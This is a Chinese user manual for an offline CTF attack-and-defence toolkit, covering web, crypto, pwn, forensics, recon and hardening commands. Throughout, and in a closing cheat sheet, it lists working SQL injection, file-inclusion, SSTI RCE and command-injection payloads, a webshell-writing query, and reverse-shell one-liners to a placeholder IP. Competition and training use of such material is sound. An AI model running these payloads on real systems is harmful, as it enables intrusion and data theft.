# CTF 攻防自动化工具包 — 完整使用文档

> 版本: 1.0 | 适用: 隔离网络/内网CTF攻防竞赛 | 环境: Kali Linux
> 工具包路径: /root/ctf-toolkit/ | 快捷命令: ctf

---

## 目录

1. 工具包总览
2. 环境准备与初始化
3. Web攻击模块详解
4. 密码学模块详解
5. PWN模块详解
6. 逆向工程模块详解
7. Misc/取证模块详解
8. 侦察模块详解
9. 防御模块详解
10. 自动化脚本详解
11. GUI图形界面使用
12. 实战比赛流程
13. 常见问题与排错

---

## 1. 工具包总览

### 1.1 设计目标

本工具包专为线下CTF攻防竞赛设计，解决以下痛点:

- 赛场隔离网络，无法使用在线工具和大模型
- 手工输入命令慢，容易遗漏检查项
- 攻防兼备，既要有攻击脚本也要有防御加固
- 需要快速在不同题型间切换

### 1.2 架构

```
ctf.sh (主入口路由)
  ├── web/        10个脚本 — Web全类型攻击
  ├── crypto/     4个脚本  — 密码学全栈
  ├── pwn/        4个脚本  — 二进制利用
  ├── reverse/    3个脚本  — 逆向分析
  ├── misc/       5个脚本  — 杂项/取证
  ├── recon/      4个脚本  — 网络侦察
  ├── defense/    4个脚本  — 防御加固
  ├── scripts/    3个脚本  — 自动化编排
  ├── payloads/   Payload模板库
  ├── wordlists/  离线字典
  ├── loot/       战利品输出
  └── notes/      笔记
```

### 1.3 依赖工具清单

| 工具 | 用途 | 状态 |
|------|------|------|
| nmap | 端口扫描/服务识别 | ✅ 已安装 |
| masscan | 快速全端口扫描 | ✅ 已安装 |
| sqlmap | SQL注入自动化 | ✅ 已安装 |
| hydra | 密码暴力破解 | ✅ 已安装 |
| gobuster | 目录爆破 | ✅ 已安装 |
| ffuf | 模糊测试 | ✅ 已安装 |
| nuclei | 漏洞模板扫描 | ✅ 已安装 |
| nikto | Web服务器扫描 | ✅ 已安装 |
| hashcat | GPU哈希破解 | ✅ 已安装 |
| john | 密码破解 | ✅ 已安装 |
| steghide | JPEG隐写 | ✅ 已安装 |
| binwalk | 固件/文件分析 | ✅ 已安装 |
| exiftool | 元数据提取 | ✅ 已安装 |
| checksec | 二进制保护检查 | ✅ 已安装 |
| ROPgadget | ROP链搜索 | ✅ 已安装 |
| radare2 | 逆向分析 | ✅ 已安装 |
| gdb | 调试器 | ✅ 已安装 |
| tshark | 流量分析 | ✅ 已安装 |
| curl | HTTP请求 | ✅ 已安装 |
| socat | 网络工具 | ✅ 已安装 |

---

## 2. 环境准备与初始化

### 2.1 首次使用

```bash
# 1. 进入工具包目录
cd /root/ctf-toolkit

# 2. 运行初始化脚本
bash setup.sh

# 3. 验证安装
ctf help
```

### 2.2 初始化做了什么

- 创建 loot/ 输出目录结构
- 设置所有脚本可执行权限
- 检查26个依赖工具是否安装
- 注册 `ctf` 快捷命令到 /usr/local/bin/

### 2.3 Python环境注意

工具包使用 `/usr/bin/python3` (系统自带)。如果 `/usr/local/bin/python3` 出现卡住的情况，所有脚本已自动使用正确路径。

### 2.4 赛前准备清单

```
□ 运行 bash setup.sh 确认工具链完整
□ 运行 ctf help 确认命令可用
□ 准备好笔记本和笔
□ 确认网络连接(VPN/直连)
□ 确认flag提交平台地址
□ 确认比赛规则(积分衰减/writeup要求)
□ 准备好 Burp Suite (如果允许)
```

---

## 3. Web攻击模块详解

### 3.1 ctf web-recon — Web快速侦察

**用途**: 对目标URL执行10项自动化检查，快速发现攻击面。

**命令**:
```bash
ctf web-recon http://192.168.1.100
ctf web-recon https://target.com:8080
```

**检查项**:
1. 响应头分析 — Server/X-Powered-By/Set-Cookie
2. 源码关键信息 — flag/password/secret/key/token
3. HTML注释提取 — 隐藏信息/开发者备注
4. JS文件分析 — API路由/密钥/内网IP
5. 敏感文件探测 — .git/.env/backup/actuator/swagger等40+路径
6. 参数FUZZ — 30个常见参数名测试
7. 子目录扫描 — 30个常见目录
8. HTTP方法检测 — PUT/DELETE/PATCH/TRACE
9. CORS检测 — 跨域资源共享配置
10. WAF检测 — 识别云WAF/防火墙

**输出**: 结果保存到 `loot/web/` 目录

**实战技巧**:
- 先跑 web-recon 建立基线，再针对性深入
- 注意 .git/HEAD 泄露可以用 git-dumper 下载完整源码
- actuator/env 可能泄露数据库密码
- JS文件中的 API 路由往往是突破口

---

### 3.2 ctf sqli — SQL注入检测

**用途**: 自动检测4种SQL注入类型。

**命令**:
```bash
ctf sqli http://target/page?id=1
ctf sqli http://target/page?id=1 id
ctf sqli http://target/search?q=test q
```

**检测方法**:
1. 基于错误 — `'`, `"`, `)`, `UNION` 等触发SQL错误
2. 时间盲注 — `SLEEP(3)` 检测延迟
3. 布尔盲注 — `AND 1=1` vs `AND 1=2` 响应差异
4. WAF绕过 — `/**/UNION/**/SELECT`, `/*!50000UNION*/`, `%0a`换行

**手工注入速查**:
```sql
-- MySQL联合注入
' ORDER BY 1-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -

-- 报错注入
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -

-- 文件读写
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
' UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

---

### 3.3 ctf upload — 文件上传绕过

**用途**: 测试6种文件上传绕过技术。

**命令**:
```bash
ctf upload http://target /upload
ctf upload http://target /api/file/upload
```

**绕过技术**:
1. 直接上传PHP — 测试是否直接允许
2. Content-Type绕过 — 改为 image/jpeg
3. 双重扩展名 — shell.php.jpg, shell.pHp, shell.php5
4. 文件头绕过 — GIF89a + PHP代码
5. .htaccess上传 — AddType application/x-httpd-php .jpg
6. 竞争条件 — 10线程并发上传+访问

**上传成功后**:
```bash
# 验证上传
curl -sk http://target/uploads/shell.php

# 执行命令 (密码: ctf)
curl -sk -X POST http://target/uploads/shell.php -d "pass=ctf&cmd=id"
curl -sk -X POST http://target/uploads/shell.php -d "pass=ctf&cmd=cat /flag"
```

---

### 3.4 ctf ssti — SSTI模板注入

**用途**: 检测5种模板引擎，尝试7种RCE payload。

**命令**:
```bash
ctf ssti http://target/?name=test
ctf ssti http://target/greeting name
```

**检测流程**:
1. 模板引擎识别 — `{{7*7}}` → Jinja2, `${7*7}` → Freemarker
2. RCE Payload — `config.__class__`, `lipsum.__globals__`, `cycler.__init__`
3. SECRET_KEY提取 — `{{config.SECRET_KEY}}`
4. 黑名单绕过 — Unicode/Hex编码

**SSTI → RCE 完整链**:
```bash
# 1. 确认SSTI
curl "http://target/?name={{7*7}}"  # 返回49

# 2. RCE
curl "http://target/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# 3. 读取SECRET_KEY
curl "http://target/?name={{config.SECRET_KEY}}"

# 4. 伪造admin session
flask-unsign --sign --cookie "{'role':'admin'}" --secret '提取到的KEY'
```

---

### 3.5 ctf lfi — 文件包含

**用途**: 检测LFI/RFI/PHP伪协议/日志投毒。

**命令**:
```bash
ctf lfi http://target/?page=index page
ctf lfi http://target/include file
```

**LFI Payload速查**:
```
../../../../../../etc/passwd
....//....//....//etc/passwd          (str_replace单次替换绕过)
php://filter/convert.base64-encode/resource=index.php
php://input                            (POST数据执行)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
/var/log/apache2/access.log            (日志投毒)
/proc/self/environ                     (环境变量包含)
```

---

### 3.6 ctf xss — XSS检测

**命令**:
```bash
ctf xss http://target/search q
```

**检测项**: 13种反射XSS payload + DOM XSS + HTTP头注入 + CSP分析

---

### 3.7 ctf jwt — JWT攻击

**命令**:
```bash
ctf jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx
```

**攻击方式**:
1. 解码 — header + payload
2. alg:none — 删除签名，改header为none
3. 密钥爆破 — 10个常见密钥 + hashcat
4. kid注入 — kid=/dev/null 让签名变空
5. 伪造admin — 修改payload中的role字段

---

### 3.8 ctf cmdi — 命令注入

**命令**:
```bash
ctf cmdi http://target/ping host
ctf cmdi http://target/dns domain
```

**检测**: 17种注入payload + 9种WAF绕过 + 反弹Shell模板

---

### 3.9 ctf shell — 生成Webshell/反弹Shell

**命令**:
```bash
ctf shell php       # 生成PHP Webshell
ctf shell jsp       # 生成JSP Webshell
ctf shell python    # 生成Python反弹Shell
ctf shell bash      # 生成Bash反弹Shell
ctf shell all       # 生成全部类型
```

**输出目录**: `payloads/generated/`

生成文件:
- shell.php — 一句话 (密码: ctf)
- shell_full.php — 功能大马 (cmd/read/write/upload/info)
- reverse.php — PHP反弹Shell
- shell.jsp — JSP一句话
- reverse.jsp — JSP反弹Shell
- reverse.py — Python反弹Shell
- reverse.sh — Bash反弹Shell
- reverse_all.sh — 全语言反弹Shell集合

---

### 3.10 ctf exploit — Web自动化漏洞利用

**命令**:
```bash
ctf exploit http://target
```

**自动检测**: SQL注入 + XSS + 文件包含 + 命令注入 + SSTI + CORS

---

## 4. 密码学模块详解

### 4.1 ctf crypto — 综合密码工具

**命令**:
```bash
ctf crypto base64 SGVsbG8=          # Base64解码
ctf crypto hex 48656c6c6f            # Hex解码
ctf crypto rot13 Uryyb               # ROT13解码
ctf crypto caesar KHOOR              # 凯撒暴力枚举26种
ctf crypto xor 48656c6c6f            # 单字节XOR暴力
ctf crypto morse ".... . .-.. .-.. ---"  # 摩尔斯解码
ctf crypto bacon AABBAABBBAABAA      # 培根密码
ctf crypto rail "Hlo ol"             # 栅栏密码(2-10栏)
ctf crypto atbash SVOOL              # Atbash密码
ctf crypto auto SGVsbG8=             # 自动检测+多层解码
```

**auto模式**: 自动尝试所有编码，递归3层解码，自动识别flag格式

---

### 4.2 ctf rsa — RSA攻击

**命令**:
```bash
# 小指数攻击 (e=3, m^3 < n)
ctf rsa small_e 3 27

# 共模攻击 (同n不同e)
ctf rsa common_mod <n> <e1> <c1> <e2> <c2>

# 费马分解 (p和q接近)
ctf rsa fermat <n>

# Pollard Rho分解
ctf rsa pollard <n>

# Hastad广播攻击 (同e不同n)
ctf rsa hastad 3 "n1,n2,n3" "c1,c2,c3"

# RSA解密 (已知d)
ctf rsa decrypt <c> <d> <n>
```

**RSA解题流程**:
1. 看e值 → e=3尝试小指数攻击
2. 看n值 → 尝试factordb.com分解(离线时用fermat/pollard)
3. 多组(n,e,c) → 尝试共模攻击或Hastad广播
4. 看dp/dq → dp泄漏攻击

---

### 4.3 ctf hash — 哈希破解

**命令**:
```bash
ctf hash 5d41402abc4b2a76b9719d911017c592     # MD5
ctf hash aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d  # SHA1
```

**流程**: 长度识别 → 常见密码暴力 → john → hashcat

---

### 4.4 ctf encode — 多重编码检测

**命令**:
```bash
ctf encode "NjU3MDZmNzI2Zg=="    # 多层嵌套编码
ctf encode "01001000 01100101"    # 二进制
ctf encode "72 101 108 108 111"   # 十进制ASCII
```

**特性**: 3层递归解码，支持base64/hex/rot13/binary/decimal/octal/url/atbash

---

## 5. PWN模块详解

### 5.1 ctf pwn-check — 二进制保护检查

**命令**:
```bash
ctf pwn-check ./vuln
```

**输出**: NX/Canary/PIE/RELRO状态 + 关键符号 + 关键字符串 + GOT/PLT + ROP gadgets + 利用建议

---

### 5.2 ctf pwn-exploit — 自动生成Exploit

**命令**:
```bash
ctf pwn-exploit ./vuln
ctf pwn-exploit ./vuln 192.168.1.100:1337
```

**输出**: 自动生成pwntools exploit模板，根据保护机制选择ret2text或ret2libc

---

### 5.3 ctf pwn-pattern — 模式字符串

**命令**:
```bash
ctf pwn-pattern 200                     # 生成200字节模式
/usr/bin/python3 pwn/pattern.py find 0x41366141 200  # 查找偏移
```

---

### 5.4 ctf pwn-rop — ROP Gadget搜索

**命令**:
```bash
ctf pwn-rop ./vuln
```

**搜索**: pop rdi/rsi/rdx + ret + system/puts地址 + /bin/sh字符串 + ret2csu

---

## 6. 逆向工程模块详解

### 6.1 ctf rev — 静态分析

**命令**:
```bash
ctf rev ./challenge
```

**分析项**: 文件类型 → 关键字符串 → ELF头 → 段信息 → 导入/导出符号 → main反汇编 → radare2分析

---

### 6.2 ctf rev-dynamic — 动态分析

**命令**:
```bash
ctf rev-dynamic ./challenge
```

**分析项**: 运行测试 → strace系统调用 → ltrace库函数 → 环境检查 → 格式化字符串测试 → 溢出测试

---

### 6.3 ctf rev-pyc — Python字节码反编译

**命令**:
```bash
ctf rev-pyc app.pyc
```

**输出**: Magic号 → 常量池 → 变量名 → 函数名 → 完整反汇编(dis) → 嵌套函数

---

## 7. Misc/取证模块详解

### 7.1 ctf stego — 隐写分析

**命令**:
```bash
ctf stego image.png
ctf stego photo.jpg
ctf stego audio.wav
```

**PNG分析流程**:
1. file — 文件类型确认
2. strings — 搜索flag/关键词
3. binwalk — 嵌入文件检测
4. exiftool — 元数据 + trailer警告
5. pngcheck — PNG完整性
6. zsteg -a — 全位平面LSB分析
7. IHDR高度篡改 — 自动修改高度生成新图片
8. trailer提取 — IEND后数据(hex+text)
9. XOR暴力 — 单字节XOR搜索flag
10. stegoveritas — 深度自动分析

**JPEG分析**: steghide空密码/常见密码提取

**音频**: Audacity频谱图 / SSTV / DTMF / 摩尔斯

---

### 7.2 ctf forensics — 文件取证

**命令**:
```bash
ctf forensics evidence.dd
ctf forensics mystery_file
```

**分析**: 文件头魔数 → binwalk提取 → strings深度 → 元数据 → 隐藏数据签名搜索

---

### 7.3 ctf pcap — 流量包分析

**命令**:
```bash
ctf pcap capture.pcap
```

**分析项**:
1. capinfos — 基本信息(包数/时长/协议)
2. 协议分布 — tshark io,phs
3. HTTP流量 — 请求方法/URI/Host
4. HTTP对象导出 — 自动导出到 /tmp/pcap_http/
5. DNS查询 — 所有域名
6. FTP流量 — 命令和参数
7. TCP流重组 — 会话列表
8. Flag搜索 — 明文 + base64编码

---

### 7.4 ctf file — 文件深度分析

**命令**:
```bash
ctf file mystery.bin
```

**分析**: 文件头签名识别(20+格式) → binwalk → strings → 嵌入文件头搜索(PNG/GIF/JPEG/ZIP/PDF/ELF/FLAG)

---

### 7.5 ctf zip — 压缩包破解

**命令**:
```bash
ctf zip secret.zip
```

**流程**:
1. 伪加密检测 — 检查加密标志位，自动修复
2. bkcrack — 已知明文攻击
3. fcrackzip — 常见密码
4. john — 哈希破解
5. hashcat — GPU加速
6. CRC32暴力 — 小文件CRC碰撞

---

## 8. 侦察模块详解

### 8.1 ctf scan — 端口扫描

**命令**:
```bash
ctf scan 192.168.1.100
ctf scan 192.168.1.0/24
```

**流程**: masscan全端口(1-65535) → nmap服务版本+默认脚本 → UDP扫描 → OS指纹

---

### 8.2 ctf enum — 服务枚举

**命令**:
```bash
ctf enum 192.168.1.100
```

**枚举**: HTTP(多端口) → SSH(banner+算法) → FTP(banner+匿名) → MySQL(默认凭证) → Redis(未授权) → SMB(共享+用户) → SNMP(OID)

---

### 8.3 ctf brute — 暴力破解

**命令**:
```bash
ctf brute 192.168.1.100 ssh
ctf brute 192.168.1.100 ftp
ctf brute 192.168.1.100 mysql
ctf brute 192.168.1.100 http-post
ctf brute 192.168.1.100 smb
```

**字典**: 内置用户名(30+) + 密码(80+) + rockyou.txt前1000行

---

### 8.4 ctf fuzz — 目录/参数FUZZ

**命令**:
```bash
ctf fuzz http://target
```

**功能**: 目录爆破(60+路径) → 参数发现(30个参数) → HTTP方法测试 → gobuster/ffuf

---

## 9. 防御模块详解

### 9.1 ctf monitor — 流量监控

**命令**:
```bash
ctf monitor eth0
```

**功能**: 活跃连接 → 监听端口 → 入站TOP10 → 实时抓包(10秒)

---

### 9.2 ctf patch — 漏洞修补

**命令**:
```bash
ctf patch ssh       # SSH加固
ctf patch mysql     # MySQL加固
ctf patch redis     # Redis加固
ctf patch apache    # Apache加固
ctf patch nginx     # Nginx加固
ctf patch php       # PHP加固
ctf patch all       # 全部加固
```

**SSH加固示例**:
```bash
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart sshd
```

---

### 9.3 ctf flag-protect — Flag保护

**命令**:
```bash
ctf flag-protect
```

**功能**: 搜索flag位置 → 权限加固(600) → 监控建议 → 快速加固脚本

---

### 9.4 ctf detect — 攻击检测

**命令**:
```bash
ctf detect
```

**检测项**: 网络连接 → 异常端口 → 可疑进程(nc/bash -i/python socket) → 最近修改文件 → SUID → cron → 用户 → 日志

---

## 10. 自动化脚本详解

### 10.1 ctf auto — 全自动攻击链

**命令**:
```bash
ctf auto 192.168.1.100
```

**5个阶段**:
1. 网络侦察 — nmap端口扫描+服务识别
2. 服务枚举 — HTTP敏感路径+Redis/MySQL未授权
3. 漏洞扫描 — SSH/FTP/MySQL弱口令
4. Web漏洞 — SQLi/XSS/SSTI/LFI/CORS
5. Flag搜索 — 文件/环境变量/内存

**输出**: 完整结果保存到 `loot/auto/` 目录

---

### 10.2 ctf flag-hunt — Flag搜索

**命令**:
```bash
ctf flag-hunt /          # 搜索根目录
ctf flag-hunt /var/www   # 搜索Web目录
ctf flag-hunt /home      # 搜索用户目录
```

**搜索**: 文件名(flag*) → 文件内容(flag{) → 环境变量 → 数据库(MySQL/Redis/SQLite) → 内存(/proc) → bash历史

---

### 10.3 ctf batch — 批量利用

**命令**:
```bash
# 准备targets.txt
echo "192.168.1.101" > targets.txt
echo "192.168.1.102" >> targets.txt
echo "192.168.1.103" >> targets.txt

ctf batch targets.txt
```

**对每个目标**: 端口扫描 → HTTP检测 → 弱口令 → Redis/MySQL未授权

---

## 11. GUI图形界面使用

### 11.1 启动GUI

```bash
# 方法1: 快捷命令
ctf-gui

# 方法2: 直接运行
/usr/bin/python3 /root/ctf-toolkit/gui/ctf_gui.py

# 方法3: 后台运行(不阻塞终端)
nohup /usr/bin/python3 /root/ctf-toolkit/gui/ctf_gui.py &
```

### 11.2 GUI功能

图形界面提供以下功能:

- **标签页式布局** — Web/Crypto/PWN/Reverse/Misc/Recon/Defense 7个标签
- **一键执行** — 点击按钮直接运行对应脚本
- **参数输入** — 文本框输入目标URL/IP/文件路径
- **实时输出** — 滚动文本框显示脚本输出
- **快捷工具** — 常用payload一键复制
- **Flag记录** — 自动记录找到的flag
- **笔记功能** — 随时记录发现

### 11.3 GUI操作流程

1. 启动GUI
2. 选择标签页(如Web)
3. 输入目标URL
4. 点击对应按钮(如"Web侦察")
5. 查看输出结果
6. 记录发现的flag

---

## 12. 实战比赛流程

### 12.1 攻防模式 (AWD)

```
赛前准备 (前15分钟):
├── 1. ctf scan <网段>                    扫描所有靶机
├── 2. ctf flag-protect                   保护自己的flag
├── 3. ctf patch all                      加固所有服务
└── 4. ctf detect                         检查初始状态

攻击阶段:
├── 1. ctf auto <每台靶机>                全自动扫描
├── 2. ctf web-recon + ctf exploit        Web漏洞
├── 3. ctf brute <靶机> ssh/ftp/mysql     弱口令
├── 4. ctf flag-hunt /                    搜索flag
└── 5. 立即提交flag

防御阶段:
├── 1. ctf monitor eth0                   监控流量
├── 2. ctf detect                         检测入侵
├── 3. ctf patch <被攻击服务>              修补漏洞
└── 4. ctf flag-protect                   重新保护flag
```

### 12.2 Jeopardy模式 (解题)

```
开场 (前30分钟):
├── 1. 浏览所有题目
├── 2. 标记简单题(签到/低分)
└── 3. ctf help 确认工具可用

解题顺序:
├── 1. 签到题 → Misc快速 (ctf file/ctf stego)
├── 2. Web题 → ctf web-recon → ctf exploit/sqli/ssti
├── 3. Crypto题 → ctf crypto auto → ctf encode → ctf rsa
├── 4. PWN题 → ctf pwn-check → ctf pwn-exploit
├── 5. Reverse题 → ctf rev → ctf rev-dynamic
└── 6. 难题 → 最后攻关

每题流程:
├── 1. 下载附件/访问靶机
├── 2. ctf file/ctf web-recon 初步分析
├── 3. 根据类型选择工具
├── 4. 拿到flag立即提交
└── 5. 记录解题过程(writeup)
```

### 12.3 比赛技巧

1. **时间就是分数** — 拿到flag立即提交，不要等
2. **先易后难** — 30分钟没思路就跳过
3. **团队分工** — Web/Misc/Crypto/PWN各负责
4. **善用搜索** — 题目名 + CTF + writeup
5. **注意规则** — flag格式(flag{}/ctf{}/FLAG{})
6. **记录过程** — writeup可能加分
7. **防御优先** — AWD模式先保护自己的flag

---

## 13. 常见问题与排错

### Q1: python3 命令卡住不响应
**原因**: /usr/local/bin/python3 可能有环境问题
**解决**: 所有脚本已自动使用 /usr/bin/python3

### Q2: nmap扫描很慢
**解决**: 使用 masscan 先快速扫描，再用 nmap 精确扫描
```bash
masscan -p1-65535 target --rate=5000 -oL ports.txt
nmap -Pn -sV -sC -p $(awk '/open/{print $4}' ports.txt | tr '\n' ',') target
```

### Q3: sqlmap被WAF拦截
**解决**: 使用 --tamper 参数
```bash
sqlmap -u "URL" --tamper=space2comment,between --random-agent --batch
```

### Q4: 文件上传不解析
**解决**: 不要执着于RCE，改报未授权上传/钓鱼/恶意文件分发

### Q5: flag提交被拒
**排查**: 原样 → 去flag{} → 大写 → 去空格 → 检查特殊字符

### Q6: 工具包脚本报错
**排查**:
```bash
# 检查权限
ls -la /root/ctf-toolkit/web/recon.sh

# 检查bash语法
bash -n /root/ctf-toolkit/web/recon.sh

# 手动运行看错误
bash -x /root/ctf-toolkit/web/recon.sh http://target
```

### Q7: 如何扩展工具包
```bash
# 添加新脚本
vim /root/ctf-toolkit/web/new_attack.sh
chmod +x /root/ctf-toolkit/web/new_attack.sh

# 在ctf.sh中添加路由
# new-attack)  bash "$TOOLKIT_DIR/web/new_attack.sh" "${@:2}" ;;
```

---

## 附录: Payload速查卡

### SQL注入
```
' OR 1=1-- -
' UNION SELECT 1,2,3-- -
' AND SLEEP(3)-- -
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
/**/UNION/**/SELECT/**/1,2,3-- -
```

### 文件包含
```
../../../../../../etc/passwd
....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

### 命令注入
```
;id
|id
$(id)
`id`
cat${IFS}/etc/passwd
c'a't /etc/passwd
```

### 反弹Shell
```bash
bash -i >& /dev/tcp/IP/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f
```

### SSTI (Jinja2)
```
{{7*7}}                           # 检测
{{config.SECRET_KEY}}             # 密钥
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}  # RCE
```

---

文档编写: 2026-06-03
工具包路径: /root/ctf-toolkit/
